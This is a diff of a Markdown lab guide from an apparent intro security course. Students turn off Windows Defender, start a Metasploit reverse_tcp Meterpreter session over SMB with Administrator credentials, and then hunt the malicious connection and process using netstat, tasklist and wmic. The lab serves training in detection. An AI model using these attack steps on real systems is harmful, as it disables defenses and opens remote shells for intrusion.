@@ -1,16 +1,14 @@
-
-
 # Windows CLI
 
 In this lab, we will create **malware**, run it, and use the tools we went through in the slides to look at what an attack looks like on a live system.  
 
 One of the best ways to learn is to actually just dig in and do it.  
 
-Let’s get started by opening a Terminal.  
+Let’s get started by opening a terminal.  
 
 ![](attachments/OpeningKaliInstance.png)
 
-Alternatively, you can open a Kali instance by clicking the Kali logo in the taskbar.
+Alternatively, you can open a **Kali** instance by clicking the **Kali** logo in the taskbar.
 
 ![](attachments/TaskbarKaliIcon.png)
 
@@ -22,7 +20,11 @@ Before going any further, we need to ensure that **Windows Defender** is disable
 
 ![](attachments/windowscli_disabledefender.png)
 
-Please note, if you get red errors that say </pre> A general error occurred that is not covered by a more specific error code.</pre> that is OK!  It means **Defender** was disabled.  We run the above command to ensure that it is off for this lab.  It has a sneaky way of turning back on again...
+Please note, if you get red errors that say 
+
+<pre>A general error occurred that is not covered by a more specific error code.</pre> 
+
+That is OK!  It means **Defender** was disabled.  We run the above command to ensure that it is off for this lab.  It has a sneaky way of turning back on again...
 
 Now that we disabled **Windows Defender**, we can head back to our **Kali** terminal.
 
@@ -32,11 +34,11 @@ Within the terminal, please run the following command:
 
 ![](attachments/windowscli_ifconfig.png)
 
-Please note the IP address of **==your==** Ethernet adapter. 
+Please note the IP address of **your** Ethernet adapter. 
 
 Please note that my adapter is called **eth0** and my IP address is **172.26.19.133.**   
 
-==**Your IP Address and adapter name may be different.**==
+**Your IP Address and adapter name may be different.**
 
 Please note your IP address for the **ADHD Linux system** on a piece of paper:
 
@@ -49,6 +51,7 @@ Next, we will start the **Metasploit** handler with the following command:
 <pre>msfconsole -q</pre>
 
 It will take a second to connect, be patient!
+
 When connected, our terminal will look like this.
 
 ![](attachments/windowscli_msfconnected.png)
@@ -63,15 +66,15 @@ We will continue by running this command to set the location of the payload:
 
 <pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-We also need to set the RHOST IP by using the following command:
+We also need to set the **RHOST IP** by using the following command:
 
 <pre>set RHOST 10.10.1.209</pre>
 
 ![](attachments/windowscli_sets.png)
 
-Remember, your IP will be different!
+**Remember, your IP will be different!**
 
-Next, we need to set the SMB username and password. 
+Next, we need to set the **SMB** username and password. 
 
 <pre>set SMBUSER Administrator</pre>
 
@@ -91,11 +94,12 @@ While there is not much here for this lab, it is key to remember that these two 
 
 We are not done with network connections yet.  Lets try looking at our malware!
 
-Go ahead an open an instance of Windows PowerShell.
+Go ahead an open an instance of **Windows PowerShell**.
 
 ![](attachments/OpeningPowershell.png)
 
 Run the following command:
+
 <pre>netstat -naob</pre>
 
 ![](attachments/windowscli_netstat.png)
@@ -111,23 +115,21 @@ Now, let's drill down on that connection with some more data:
 
 <pre>netstat -f</pre>
 
-I like to run -f with netstat to see if there are any systems with fully qualified domains that we may be able to ignore. 
+I like to run **"-f"** with netstat to see if there are any systems with fully qualified domains that we may be able to ignore. 
 
 ![](attachments/windowscli_-f.png)
 
-Now we see our last connection with the port 4444.
+Now we see our last connection with the **port 4444**.
 
 Let's get the Process ID **(PID)** from the above screenshot so we can dig a little deeper.
 
 ![](attachments/windowscli_pid.png)
 
-Now, let's dive in!
-
-First we will start with tasklist  
+We will start with tasklist  
 
 <pre>tasklist /m /fi "pid eq [PID]"</pre>
 
-==**YOUR PID WILL BE DIFFERENT!**==
+**YOUR PID WILL BE DIFFERENT!**
 
 ![](attachments/windowscli_tasklist.png)
 
@@ -148,12 +150,17 @@ Let's see if we can see what spawned the process with **wmic**.
 ![](attachments/windowscli_selectstring.png)
 
 Lets go through the steps we took to hunt for a malicious process
->We found its parent process ID.  
->We did a search on that process ID.  
->As you can see above, it was launched by the cmd.exe process.  
->Note that the search we just did may turn up some other things launched by the command line as well.
+
+1. We found its parent process ID.  
+
+2. We did a search on that process ID.  
+
+3. As you can see above, it was launched by the cmd.exe process.  
+
+4. Note that the search we just did may turn up some other things launched by the command line as well.
 
 ***
+
 [Back to Navigation Menu](/IntroClassFiles/navigation.md)
 
 
